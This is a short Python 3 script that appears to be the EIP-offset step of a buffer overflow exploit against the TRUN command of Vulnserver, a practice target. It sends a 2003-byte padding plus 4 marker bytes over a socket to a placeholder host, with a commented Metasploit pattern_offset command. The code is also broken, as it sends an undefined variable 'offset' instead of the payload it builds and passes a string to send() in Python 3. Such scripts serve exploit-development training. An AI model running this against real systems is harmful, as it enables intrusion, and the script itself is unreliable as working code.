#!/usr/bin/python3
import sys, socket

#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337

shellcode = "A" * 2003 + "B" * 4

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('IP', PORT)) #CHANGE
        s.send(('TRUN /.:/' + offset))
        s.close()

except:
        print("Error connecting to the server")
        sys.exit()
